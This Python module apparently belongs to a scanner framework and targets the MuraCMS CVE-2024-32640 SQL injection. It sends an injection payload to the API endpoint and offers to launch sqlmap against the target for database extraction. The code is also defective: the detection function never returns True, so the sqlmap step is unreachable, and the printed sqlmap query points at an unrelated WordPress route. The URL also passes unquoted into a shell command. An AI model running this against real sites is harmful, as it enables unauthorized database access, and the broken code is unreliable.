#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from urllib.parse import urlparse
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
from rich.prompt import Prompt
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Cve_2024_32640:
    def Injection(self,url, endpoint):
        try:
            SQL_ERROR_MESSAGE = "You have an error in your SQL syntax"
            host = urlparse(url).netloc
            headers = {
                "User-Agent":self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": host,
            }
            data = {
            "object": "displayregion",
            "contenthistid": "x%5c",
            "previewid": "1"
            }

            url = f"{url}{endpoint}"
            r = requests.post(url, headers=headers, verify=self.ssl, data=data,timeout=self.timeout,proxies=self.proxy)

            if SQL_ERROR_MESSAGE in r.text or r.status_code == 500:
                OutPrintInfoSuc("MuraCMS", f'目标存在MuraCMS CVE-2024-32640 SQL注入漏洞: {url}')
                if self.batch:
                    OutPutFile("muracms_2024_32640.txt", f'目标存在MuraCMS CVE-2024-32640 SQL注入漏洞: {url}')

            else:
                if not self.batch:
                    OutPrintInfo("MuraCMS", '目标不存在MuraCMS CVE-2024-32640 SQL漏洞')

        except Exception:
            if not self.batch:
                OutPrintInfo("MuraCMS", '目标请求出错')


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("MuraCMS", '开始检测MuraCMS CVE-2024-32640 SQL漏洞...')
        endpoint = "/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x"
        if self.Injection(url, endpoint):
            if not self.batch:
                choose = Prompt.ask("是否调用SQLMAP",choices=["y","n"])
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",
                                     f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/?rest_route=/h5vp/v1/view/1&id=1\'+AND+(SELECT+1+FROM+(SELECT(*))a)--+" --output-dir={dir}/result/ --batch')
                        os.system(
                            f"sqlmap -u \"{url}/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x\" -p contenthistid --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
            "-p contenthistid --batch"
        if not self.batch:
            OutPrintInfo("MuraCMS", 'MuraCMS CVE-2024-32640 SQL漏洞检测结束')

